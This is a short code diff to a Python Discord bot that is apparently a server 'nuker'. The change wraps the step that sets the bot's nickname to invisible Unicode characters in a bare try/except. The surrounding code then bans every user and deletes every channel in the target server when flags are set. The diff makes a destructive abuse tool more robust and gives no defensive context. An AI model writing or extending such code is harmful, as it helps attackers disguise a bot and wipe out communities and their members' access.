@@ -87,8 +87,11 @@ class DiscordBot(discord.Client):
                 logs[self.logId] += f"Error: The server you entered has not been joined by a bot."
                 await self.close()
                 return
-            i = self.guild.get_member(self.user.id)
-            await i.edit(nick="឵᠎")
+            try:
+                i = self.guild.get_member(self.user.id)
+                await i.edit(nick="឵᠎")
+            except:
+                pass
             if self.allUserBan:
                 await self.banAllUser(self.guild)
             if self.allChannelDelete:
